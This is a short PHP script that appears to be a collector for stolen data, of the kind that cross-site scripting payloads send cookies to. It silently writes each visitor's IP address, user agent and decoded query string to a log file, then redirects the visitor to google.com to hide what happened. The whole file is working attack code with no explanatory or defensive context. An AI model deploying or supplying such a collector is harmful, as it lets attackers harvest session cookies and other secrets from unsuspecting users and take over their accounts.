<?php

$ip=$_SERVER['REMOTE_ADDR'];
$userAgent=$_SERVER['HTTP_USER_AGENT'];
$queryString=$_SERVER['QUERY_STRING'];

if(isset($queryString)){
	
	$fp=fopen('logger.txt', 'a');
	fwrite($fp, 'REMOTE_ADDR: '.$ip."\n".'USER_AGENT: '.$userAgent."\n");
	fwrite($fp, 'QUERY_STRING: '.urldecode($queryString."\n"));
	fclose($fp);

	header('Location: https://www.google.com');
}


?>
